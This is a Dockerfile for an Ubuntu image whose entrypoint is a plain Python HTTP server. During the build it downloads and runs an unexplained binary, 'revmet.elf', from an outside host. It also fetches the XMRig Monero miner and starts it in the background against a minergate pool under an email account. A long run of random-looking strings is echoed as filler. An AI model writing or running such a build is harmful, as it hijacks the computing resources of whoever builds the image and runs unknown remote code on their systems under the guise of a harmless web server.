FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo oOYj8blrKYFRMm5xFRkOXRKdWybIs26W PdbCfqVAQc8hQWCkoreYoSiybilVqjF1 vpQCTyqwuJRM0GRC46zhVqwg2hXZpqrh 7lm0eXZTplH0LjauY9GBaxnBOwr3Qgdp Of0uxAxZ46awsU6zqg11U0l1PnKxj3XZ pRpeFGtbUVPDLrs6P3XMjGJOYf6NcjXb nMJTsRqWms9fDWl2PohcUXk4rBjaVjuI 9xZawmBiQqk3UQsPGY8Y5u5sU294jGkm sg4ZABKog7lAg9NYx3UuWosBGu9mUb2H 7IOHNAlObWbI58NSNIBYE3wNN6rcZiRC DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]